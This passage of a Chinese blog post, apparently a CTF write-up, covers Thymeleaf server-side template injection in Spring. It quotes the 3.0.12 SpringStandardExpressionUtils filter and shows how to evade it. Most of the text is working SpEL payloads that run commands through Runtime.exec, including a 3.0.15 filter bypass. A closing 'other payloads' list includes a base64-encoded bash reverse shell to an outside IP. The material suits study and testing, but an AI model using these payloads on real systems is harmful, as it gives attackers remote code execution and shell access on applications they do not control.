<h2 id="省略"><a href="#省略" class="headerlink" title="省略__"></a>省略__</h2><p>当Controller如下配置时，可以省略<code>__</code>包裹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/path"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">path2</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span> <span class="token class-name">String</span> lang<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> lang<span class="token punctuation">;</span> <span class="token comment">//template path is tainted</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>即去掉了前后缀</p>
<p>payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">$<span class="token operator">%</span><span class="token number">7</span>bnew<span class="token operator">%</span><span class="token number">20</span>java<span class="token punctuation">.</span>util<span class="token punctuation">.</span><span class="token function">Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">22</span>open<span class="token operator">%</span><span class="token number">20</span><span class="token operator">-</span>a<span class="token operator">%</span><span class="token number">20</span>calculator<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">7d</span><span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="高版本下的bypass"><a href="#高版本下的bypass" class="headerlink" title="高版本下的bypass"></a>高版本下的bypass</h1><p>在<strong>3.0.12</strong>版本，Thymeleaf 在 <code>util</code>目录下增加了一个名为<code>SpringStandardExpressionUtils.java</code>的文件</p>
<p>当调用表达式的时候，会经过该函数的判断：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">containsSpELInstantiationOrStatic</span><span class="token punctuation">(</span><span class="token keyword">final</span> <span class="token class-name">String</span> expression<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token keyword">final</span> <span class="token keyword">int</span> explen <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> explen<span class="token punctuation">;</span>
        <span class="token keyword">int</span> ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// index for computing position in the NEW_ARRAY</span>
        <span class="token keyword">int</span> si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span> c<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>n<span class="token operator">--</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

            c <span class="token operator">=</span> expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">&lt;</span> <span class="token constant">NEW_LEN</span>
                    <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token constant">NEW_ARRAY</span><span class="token punctuation">[</span>ni<span class="token punctuation">]</span>
                    <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> explen<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isWhitespace</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                ni<span class="token operator">++</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">==</span> <span class="token constant">NEW_LEN</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">// we found an object instantiation</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>ni <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                n <span class="token operator">+=</span> ni<span class="token punctuation">;</span>
                ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">&lt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token comment">// This has to be restarted too</span>
                    si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

            ni <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token char">')'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                si <span class="token operator">=</span> n<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> c <span class="token operator">==</span> <span class="token char">'('</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token char">'T'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>si <span class="token operator">></span> n <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isJavaIdentifierPart</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                si <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到其主要逻辑是：首先倒序检测是否包含<code>wen</code>关键字、在<code>(</code>的左边的字符是否是<code>T</code>，如包含，那么认为找到了一个实例化对象，返回<code>true</code>，阻止该表达式的执行</p>
<p>因此要绕过这个函数，只要满足三点：<br>1、表达式中不能含有关键字<code>new</code><br>2、在<code>(</code>的左边的字符不能是<code>T</code><br>3、不能在<code>T</code>和<code>(</code>中间添加的字符使得原表达式出现问题</p>
<p>关于这个的绕过方法是<code>%20</code>，<code>%0a</code>，<code>%09</code></p>
<p>最终payload：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token punctuation">;</span><span class="token operator">/</span>__$<span class="token punctuation">&#123;</span><span class="token function">t</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>runtime<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getruntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token punctuation">.</span>x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">/</span>path<span class="token comment">//__$&#123;t(java.lang.runtime).getruntime().exec("calc")&#125;__::.x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注意：命令执行的payload 中不能含有<code>/</code></p>
<hr>
<h1 id="2-x版本"><a href="#2-x版本" class="headerlink" title="2.x版本"></a>2.x版本</h1><p>片段表达式 <code>~&#123; &#125;</code>这个特性是在 3.0 版本引入的，但是其实 2.x 版本也能触发漏洞</p>
<p>同样存在 preprocess 方法来处理预处理表达式</p>
<p>对于不含预处理表达式的 payload, 同样能够执行, 只是位置不太一样</p>
<hr>
<h1 id="其它的payload"><a href="#其它的payload" class="headerlink" title="其它的payload"></a>其它的payload</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-java" data-language="java"><code class="language-java">__$<span class="token punctuation">&#123;</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>Scanner</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"id"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>__<span class="token operator">::</span><span class="token function">x</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>3.0.15版本，来自于rwctf2024</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">[</span><span class="token punctuation">[</span>$<span class="token punctuation">&#123;</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Boolean</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.ObjectMapper"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span><span class="token string">"&#123;&#125;"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span>SpelExpressionParser</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"T(Runtime).getRuntime().exec('whoami')"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>或者</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name"><span class="token namespace">th:</span>href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEuMS4xLzI5OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;')&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>pepito<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="相关题目"><a href="#相关题目" class="headerlink" title="相关题目"></a>相关题目</h1><p><a href="https://c1oudfl0w0.github.io/blog/2024/04/03/%E7%BA%A2%E6%98%8E%E8%B0%B72024/#Simp1escape%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89">红明谷2024 Simp1escape</a></p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>